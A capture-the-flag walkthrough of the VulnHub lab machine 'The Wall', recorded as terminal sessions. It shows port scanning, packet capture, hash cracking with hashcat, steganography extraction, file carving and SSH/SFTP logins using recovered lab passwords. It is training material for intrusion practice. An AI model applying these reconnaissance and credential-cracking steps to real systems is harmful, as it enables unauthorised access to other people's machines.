URL : https://www.vulnhub.com/entry/the-wall-1,130/

1.) Identify the IP address of the victim machine
root@kali:~# netdiscover 
 Currently scanning: 192.168.63.0/16   |   Screen View: Unique Hosts                                                                                                                                              
 3496 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 209760                                                                                                                                            
 _____________________________________________________________________________ 
   IP            At MAC Address      Count  Len   MAC Vendor                                                                                                                                                      
 -----------------------------------------------------------------------------                                                                                                                                    
 192.168.174.141 00:0c:29:95:45:e4    3484    209040   VMware, Inc.                                                                                                                                               
 192.168.174.2   00:50:56:ff:fc:d3    06    360   VMWare, Inc.                                                                                                                                                    
 192.168.174.1   00:50:56:c0:00:08    05    300   VMWare, Inc.                                                                                                                                                    
 192.168.174.254 00:50:56:e4:f3:84    01    060   VMWare, Inc.                                                                                                                                                    

root@kali:~# 

2.) Run an nmap syn scan to identify open ports and running services
root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.141

Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-16 13:33 EST
Nmap scan report for 192.168.174.141
Host is up (0.00025s latency).
All 65535 scanned ports on 192.168.174.141 are filtered
MAC Address: 00:0C:29:95:45:E4 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.174.141

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1338.12 seconds
root@kali:~# 

All ports are filtered

3.) Check the network traffic for the host 192.168.174.141
root@kali:~# tcpdump host 192.168.174.141
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
13:38:06.670972 IP 192.168.174.137.63662 > 192.168.174.141.61083: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:06.671514 IP 192.168.174.137.63662 > 192.168.174.141.42843: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:06.672118 IP 192.168.174.137.44117 > 192.168.174.141.55337: Flags [S], seq 3029449116, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.672518 IP 192.168.174.137.47360 > 192.168.174.141.20389: Flags [S], seq 2186346526, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.672818 IP 192.168.174.137.47749 > 192.168.174.141.15052: Flags [S], seq 4215169042, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.673081 IP 192.168.174.137.59509 > 192.168.174.141.44104: Flags [S], seq 3073469705, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.673339 IP 192.168.174.137.57088 > 192.168.174.141.39922: Flags [S], seq 317158140, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.673596 IP 192.168.174.137.38871 > 192.168.174.141.3932: Flags [S], seq 2927386423, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.673858 IP 192.168.174.137.58029 > 192.168.174.141.64845: Flags [S], seq 2720656916, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.674116 IP 192.168.174.137.45841 > 192.168.174.141.17320: Flags [S], seq 1366537007, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.674420 IP 192.168.174.137.46527 > 192.168.174.141.14228: Flags [S], seq 3318931377, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.674679 IP 192.168.174.137.59967 > 192.168.174.141.30205: Flags [S], seq 3677708816, win 29200, options [mss 1460,sackOK,TS val 179569 ecr 0,nop,wscale 7], length 0
13:38:06.675132 IP 192.168.174.137.63662 > 192.168.174.141.19738: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:06.675401 IP 192.168.174.137.63662 > 192.168.174.141.8055: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:06.675642 IP 192.168.174.137.63662 > 192.168.174.141.58468: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:06.675941 IP 192.168.174.137.63661 > 192.168.174.141.kx: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.676194 IP 192.168.174.137.63661 > 192.168.174.141.4294: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.676434 IP 192.168.174.137.63661 > 192.168.174.141.26846: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.676673 IP 192.168.174.137.63661 > 192.168.174.141.20892: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.676911 IP 192.168.174.137.63661 > 192.168.174.141.28907: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.772169 IP 192.168.174.137.63661 > 192.168.174.141.41017: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.772498 IP 192.168.174.137.63661 > 192.168.174.141.31571: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:06.772917 IP 192.168.174.137.47757 > 192.168.174.141.15052: Flags [S], seq 2788355665, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.773211 IP 192.168.174.137.47370 > 192.168.174.141.20389: Flags [S], seq 2713134630, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.773480 IP 192.168.174.137.33209 > 192.168.174.141.51789: Flags [S], seq 501483053, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.773788 IP 192.168.174.137.38879 > 192.168.174.141.3932: Flags [S], seq 3227439927, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.774066 IP 192.168.174.137.57098 > 192.168.174.141.39922: Flags [S], seq 614446676, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.774326 IP 192.168.174.137.59521 > 192.168.174.141.44104: Flags [S], seq 1609840559, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.774629 IP 192.168.174.137.46535 > 192.168.174.141.14228: Flags [S], seq 2163625960, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.774906 IP 192.168.174.137.45851 > 192.168.174.141.17320: Flags [S], seq 771549965, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.775167 IP 192.168.174.137.58041 > 192.168.174.141.64845: Flags [S], seq 2808370242, win 29200, options [mss 1460,sackOK,TS val 179594 ecr 0,nop,wscale 7], length 0
13:38:06.775960 IP 192.168.174.137.63661 > 192.168.174.141.37897: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0

Isolate and filter out the broadcast traffic
root@kali:~# tcpdump host 192.168.174.141 and not arp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
13:38:57.161163 IP 192.168.174.137.60006 > 192.168.174.141.43709: Flags [S], seq 3535028592, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.161345 IP 192.168.174.137.59020 > 192.168.174.141.6031: Flags [S], seq 3818894155, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.161484 IP 192.168.174.137.45006 > 192.168.174.141.23380: Flags [S], seq 1360448470, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.161629 IP 192.168.174.137.45603 > 192.168.174.141.62988: Flags [S], seq 1003744596, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.161762 IP 192.168.174.137.47793 > 192.168.174.141.9997: Flags [S], seq 3406986597, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.161896 IP 192.168.174.137.39023 > 192.168.174.141.59596: Flags [S], seq 2531149023, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.162031 IP 192.168.174.137.55437 > 192.168.174.141.3290: Flags [S], seq 3911637561, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.162165 IP 192.168.174.137.38046 > 192.168.174.141.38679: Flags [S], seq 3069738442, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.162306 IP 192.168.174.137.39484 > 192.168.174.141.30367: Flags [S], seq 90666531, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.162454 IP 192.168.174.137.53522 > 192.168.174.141.62561: Flags [S], seq 2393710060, win 29200, options [mss 1460,sackOK,TS val 192191 ecr 0,nop,wscale 7], length 0
13:38:57.162690 IP 192.168.174.137.63662 > 192.168.174.141.44230: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:57.162823 IP 192.168.174.137.63662 > 192.168.174.141.27619: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:57.162949 IP 192.168.174.137.63662 > 192.168.174.141.65340: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:57.163079 IP 192.168.174.137.63662 > 192.168.174.141.63345: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:57.163203 IP 192.168.174.137.63662 > 192.168.174.141.57535: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:38:57.163333 IP 192.168.174.137.63661 > 192.168.174.141.47407: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:57.163456 IP 192.168.174.137.63661 > 192.168.174.141.64144: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:57.163582 IP 192.168.174.137.63661 > 192.168.174.141.63051: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:57.163706 IP 192.168.174.137.63661 > 192.168.174.141.40279: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:38:57.164528 IP 192.168.174.137.63661 > 192.168.174.141.62556: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0

root@kali:~# tcpdump host 192.168.174.141 and not arp | grep 1337
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
13:39:45.328053 IP 192.168.174.137.63661 > 192.168.174.141.31337: Flags [S], seq 1728596804, win 1024, options [mss 1460], length 0
13:39:45.430955 IP 192.168.174.137.63662 > 192.168.174.141.31337: Flags [S], seq 1728662341, win 1024, options [mss 1460], length 0
13:39:53.996178 IP 192.168.174.141.21753 > 192.168.174.2.1337: Flags [S], seq 2289855929, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4125846848 ecr 0], length 0
13:39:53.996188 IP 192.168.174.2.1337 > 192.168.174.141.21753: Flags [R.], seq 0, ack 2289855930, win 32767, length 0
13:39:53.999374 IP 192.168.174.1.1337 > 192.168.174.141.5991: Flags [R.], seq 0, ack 357555414, win 0, length 0
13:39:53.999385 IP 192.168.174.141.5991 > 192.168.174.1.1337: Flags [S], seq 357555413, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1219668107 ecr 0], length 0
13:39:54.618181 IP 192.168.174.141.29768 > 192.168.174.67.1337: Flags [S], seq 3658946992, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3034037527 ecr 0], length 0
13:39:55.333308 IP 192.168.174.141.25603 > 192.168.174.137.1337: Flags [S], seq 3523362074, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3932564712 ecr 0], length 0
13:39:55.333328 IP 192.168.174.137.1337 > 192.168.174.141.25603: Flags [R.], seq 0, ack 3523362075, win 0, length 0
13:39:56.655848 IP 192.168.174.141.41305 > 192.168.174.254.1337: Flags [S], seq 3028865626, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2193005005 ecr 0], length 0
13:40:03.059976 IP 192.168.174.1.1337 > 192.168.174.141.43459: Flags [R.], seq 0, ack 3468204963, win 0, length 0
13:40:03.059984 IP 192.168.174.141.43459 > 192.168.174.1.1337: Flags [S], seq 3468204962, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1319121229 ecr 0], length 0
13:40:03.356273 IP 192.168.174.141.7340 > 192.168.174.2.1337: Flags [S], seq 2862920737, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1868540775 ecr 0], length 0
13:40:03.356279 IP 192.168.174.2.1337 > 192.168.174.141.7340: Flags [R.], seq 0, ack 2862920738, win 32767, length 0
13:40:03.472158 IP 192.168.174.141.20497 > 192.168.174.67.1337: Flags [S], seq 1927019163, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1402414559 ecr 0], length 0
13:40:03.818319 IP 192.168.174.137.34537 > 192.168.174.141.45439: Flags [S], seq 271337314, win 29200, options [mss 1460,sackOK,TS val 208855 ecr 0,nop,wscale 7], length 0
13:40:04.877233 IP 192.168.174.141.3489 > 192.168.174.137.1337: Flags [S], seq 568752102, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1656370448 ecr 0], length 0
13:40:04.877250 IP 192.168.174.137.1337 > 192.168.174.141.3489: Flags [R.], seq 0, ack 568752103, win 0, length 0
13:40:05.519991 IP 192.168.174.141.1798 > 192.168.174.254.1337: Flags [S], seq 3169604494, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3036604166 ecr 0], length 0
13:40:06.756896 IP 192.168.174.1.1337 > 192.168.174.141.34352: Flags [R.], seq 0, ack 205459715, win 0, length 0
13:40:06.756910 IP 192.168.174.141.34352 > 192.168.174.1.1337: Flags [S], seq 205459714, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3542740113 ecr 0], length 0
13:40:06.763906 IP 192.168.174.141.28728 > 192.168.174.2.1337: Flags [S], seq 2207590121, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2488893291 ecr 0], length 0
13:40:06.763909 IP 192.168.174.2.1337 > 192.168.174.141.28728: Flags [R.], seq 0, ack 2207590122, win 32767, length 0

Connect to any host listening on port 1337
root@kali:~# nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.174.137] from (UNKNOWN) [192.168.174.141] 4891

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   
   
              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don't be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
root@kali:~# 

4.) Again run an nmap syn scan to identify open ports and running services
root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.141

Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-16 14:08 EST
Nmap scan report for 192.168.174.141
Host is up (0.00082s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    OpenBSD httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
|_http-title: Site doesn't have a title (text/html).
1965/tcp open  ssh     OpenSSH 7.0 (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:95:45:E4 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.174.141

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.59 seconds
root@kali:~# 

5.) Enumerating port 80
http://192.168.174.141/
In page source
<html>
<body bgcolor="#000000">
<center><img src="pink_floyd.jpg"</img></center>
</body>
</html>


<!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the 
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035-->

5.) Decoding the hash
root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> string = "737465673d3333313135373330646262623337306663626539373230666536333265633035"
>>> string.decode('hex')
'steg=33115730dbbb370fcbe9720fe632ec05'
>>> 
root@kali:~# hash-identifier
   #########################################################################
   #	 __  __ 		    __		 ______    _____	   #
   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #								 By Zion3R #
   #							www.Blackploit.com #
   #						       Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: 33115730dbbb370fcbe9720fe632ec05

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+]  RAdmin v2.x
[+]  NTLM
[+]  MD4
[+]  MD2
[+]  MD5(HMAC)
[+]  MD4(HMAC)
[+]  MD2(HMAC)
[+]  MD5(HMAC(Wordpress))
[+]  Haval-128
[+]  Haval-128(HMAC)
[+]  RipeMD-128
[+]  RipeMD-128(HMAC)
[+]  SNEFRU-128
[+]  SNEFRU-128(HMAC)
[+]  Tiger-128
[+]  Tiger-128(HMAC)
[+]  md5($pass.$salt)
[+]  md5($salt.$pass)
[+]  md5($salt.$pass.$salt)
[+]  md5($salt.$pass.$username)
[+]  md5($salt.md5($pass))
[+]  md5($salt.md5($pass))
[+]  md5($salt.md5($pass.$salt))
[+]  md5($salt.md5($pass.$salt))
[+]  md5($salt.md5($salt.$pass))
[+]  md5($salt.md5(md5($pass).$salt))
[+]  md5($username.0.$pass)
[+]  md5($username.LF.$pass)
[+]  md5($username.md5($pass).$salt)
[+]  md5(md5($pass))
[+]  md5(md5($pass).$salt)
[+]  md5(md5($pass).md5($salt))
[+]  md5(md5($salt).$pass)
[+]  md5(md5($salt).md5($pass))
[+]  md5(md5($username.$pass).$salt)
[+]  md5(md5(md5($pass)))
[+]  md5(md5(md5(md5($pass))))
[+]  md5(md5(md5(md5(md5($pass)))))
[+]  md5(sha1($pass))
[+]  md5(sha1(md5($pass)))
[+]  md5(sha1(md5(sha1($pass))))
[+]  md5(strtoupper(md5($pass)))

   -------------------------------------------------------------------------
root@kali:~# cat hash
c6d6bd7ebf806f43c76acc3681703b81
root@kali:~# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2016. Please upgrade to continue using hashcat.

Initializing hashcat v0.49 with 1 threads and 32mb segment-size...

Added hashes from file hash.txt: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen

33115730dbbb370fcbe9720fe632ec05:divisionbell

All hashes have been recovered

Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, - words
Progress..: 517256/3627099 (14.26%)
Running...: --:--:--:--
Estimated.: --:--:--:--

Started: Wed Dec 16 14:10:42 2015
Stopped: Wed Dec 16 14:10:43 2015
root@kali:~# 

C:\Users\kan1shka\Desktop\steghide>steghide.exe extract -sf pink_floyd.jpg
Enter passphrase:divisionbell
wrote extracted data to "pink_floyd_syd.txt".

C:\Users\kan1shka\Desktop\steghide>type pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.


C:\Users\C5227573\Desktop\steghide>

root@kali:~# echo "U3lkQmFycmV0dA==" | base64 -d
SydBarrett
root@kali:~# 

root@kali:~# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2016. Please upgrade to continue using hashcat.

Initializing hashcat v0.49 with 1 threads and 32mb segment-size...

Added hashes from file hash.txt: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen


Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: 12.04M plains, 12.04M words
Progress..: 3627099/3627099 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--

f831605ae34c2399d1e5bb3a4ab245d0:pinkfloydrocks

All hashes have been recovered

Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 2/5 (segment), 3351795 (words), 33550340 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 11.87M words
Progress..: 1027560/3351795 (30.66%)
Running...: --:--:--:--
Estimated.: --:--:--:--

Started: Wed Dec 16 14:53:03 2015
Stopped: Wed Dec 16 14:53:04 2015
root@kali:~# 

6.) Enumerating 1965
root@kali:~/Desktop# ssh -p 1965 SydBarrett@192.168.174.141
The authenticity of host '[192.168.174.141]:1965 ([192.168.174.141]:1965)' can't be established.
ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.174.141]:1965' (ECDSA) to the list of known hosts.
SydBarrett@192.168.174.141's password: 
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.174.141 closed.
root@kali:~/Desktop# 

SSH connection is closed automatically.

Try SFTP
root@kali:~/Desktop# sftp -P 1965 SydBarrett@192.168.174.141
SydBarrett@192.168.174.141's password: 
Connected to 192.168.174.141.
sftp> ls -la
drwxr-x---    3 0        1000          512 Dec 17 01:26 .
drwxr-x---    3 0        1000          512 Oct 24 20:16 ..
drwxr-xr-x    3 0        1000          512 Oct 24 18:17 .mail
-rw-r--r--    1 0        1000         1912 Oct 25 22:56 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24 16:17 syd_barrett_profile_pic.jpg
sftp> cd .mail/
sftp> ls -lah
drwxr-xr-x    0 0        1000         512B Oct 24 14:17 .
drwxr-x---    0 0        1000         512B Oct 24 16:16 ..
drwxr-xr-x    0 0        1000         512B Nov 11 05:25 .stash
-rw-r--r--    0 0        1000         309B Oct 24 14:18 sent-items
sftp> cd .stash/
sftp> ls -lah
drwxr-xr-x    0 0        1000         512B Nov 11 05:25 .
drwxr-xr-x    0 0        1000         512B Oct 24 14:17 ..
-rw-r--r--    0 0        1000        46.6M Aug  7 10:33 eclipsed_by_the_moon
sftp> get eclipsed_by_the_moon 
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon                                                                                                                                               100%   47MB  11.7MB/s   00:04    
sftp> cd ..
sftp> ls -lah
drwxr-xr-x    0 0        1000         512B Oct 24 14:17 .
drwxr-x---    0 0        1000         512B Oct 24 16:16 ..
drwxr-xr-x    0 0        1000         512B Nov 11 05:25 .stash
-rw-r--r--    0 0        1000         309B Oct 24 14:18 sent-items
sftp> get sent-items 
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                                                                                                                                100%  309     0.3KB/s   00:00    
sftp> cd ..
sftp> get bio.txt 
Fetching /bio.txt to bio.txt
/bio.txt                                                                                                                                                                         100% 1912     1.9KB/s   00:00    
sftp> get syd_barrett_profile_pic.jpg 
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                                                                                                                                                     100%  849KB 848.6KB/s   00:00    
sftp> exit
root@kali:~/Desktop/SFTP_Data# tar xvfz eclipsed_by_the_moon
root@kali:~/Desktop/SFTP_Data# file *
bio.txt:                     UTF-8 Unicode text, with very long lines
eclipsed_by_the_moon:        gzip compressed data, from Unix, last modified: Tue Nov 10 19:15:47 2015
eclipsed_by_the_moon.lsd:    x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 188, heads 255, hidden sectors 2048, sectors 96256 (volumes > 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
sent-items:                  ASCII text
syd_barrett_profile_pic.jpg: JPEG image data, EXIF standard
root@kali:~/Desktop/SFTP_Data# 
root@kali:~/Desktop/SFTP_Data# cat sent-items 
Date: Sun, 24 Oct 1965 18:45:21 +0200
From: Syd Barrett <syd@pink.floyd>
Reply-To: Syd Barret <syd@pink.floyd>
To: Roger Waters <roger@pink.floyd>
Subject: Had to hide the stash

Roger... I had to hide the stash. 

Usual deal.. just use the scalpel when you find it.

Ok, sorry for that.

Rock on man

"Syd"

root@kali:~/Desktop/SFTP_Data# 
root@kali:/etc/scalpel# cat scalpel.conf
# Scalpel configuration file 

# This configuration file controls the
# types and sizes of files that are carved by Scalpel.  Currently,
# Scalpel can read Foremost 0.69 configuration files, but Scalpel
# configuration files may not be backwards-compatible with Foremost.
# In particular, maximum file carve size under Foremost 0.69 is 4GB,
# while in the current version of Scalpel, it's 16EB (16 exabytes).  

<-snip->
#
#
# AOL ART files
#	art	y	150000	\x4a\x47\x04\x0e	\xcf\xc7\xcb
#  	art	y 	150000	\x4a\x47\x03\x0e	\xd0\xcb\x00\x00
#
# GIF and JPG files (very common)
#	gif	y	5000000		\x47\x49\x46\x38\x37\x61	\x00\x3b
#  	gif	y 	5000000		\x47\x49\x46\x38\x39\x61	\x00\x3b
 	jpg	y	200000000	\xff\xd8\xff\xe0\x00\x10	\xff\xd9
#
#
<-snip->
root@kali:~/Desktop/SFTP_Data# scalpel eclipsed_by_the_moon.lsd
Scalpel version 1.60
Written by Golden G. Richard III, based on Foremost 0.69.

Opening target "/root/Desktop/SFTP_Data/eclipsed_by_the_moon.lsd"

Image file pass 1/2.
eclipsed_by_the_moon.lsd: 100.0% |*********************************************************************************************************************************************************|   47.0 MB    00:00 ETAAllocating work queues...
Work queues allocation complete. Building carve lists...
Carve lists built.  Workload:
jpg with header "\xff\xd8\xff\xe0\x00\x10" and footer "\xff\xd9" --> 1 files
Carving files from image.
Image file pass 2/2.
eclipsed_by_the_moon.lsd: 100.0% |*********************************************************************************************************************************************************|   47.0 MB    00:00 ETAProcessing of image file complete. Cleaning up...
Done.
Scalpel is done, files carved = 1, elapsed = 0 seconds.
root@kali:~/Desktop/SFTP_Data#

root@kali:~# ssh -p 1965 RogerWaters@192.168.174.141
RogerWaters@192.168.174.141's password: hello_is_there_anybody_in_there
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   
$ ls -lah
total 176
drwx------  3 RogerWaters  RogerWaters   512B Oct 28 09:29 .
drwxr-xr-x  7 root         wheel         512B Oct 24 17:36 ..
-rw-r--r--  1 RogerWaters  RogerWaters    87B Oct 24 17:35 .Xdefaults
-rw-r--r--  1 RogerWaters  RogerWaters   773B Oct 24 17:35 .cshrc
-rw-r--r--  1 RogerWaters  RogerWaters   103B Oct 24 17:35 .cvsrc
-rw-r--r--  1 RogerWaters  RogerWaters   398B Oct 26 04:01 .login
-rw-r--r--  1 RogerWaters  RogerWaters   175B Oct 24 17:35 .mailrc
-rw-r--r--  1 RogerWaters  RogerWaters   218B Oct 24 17:35 .profile
drwx------  2 RogerWaters  RogerWaters   512B Oct 26 03:56 .ssh
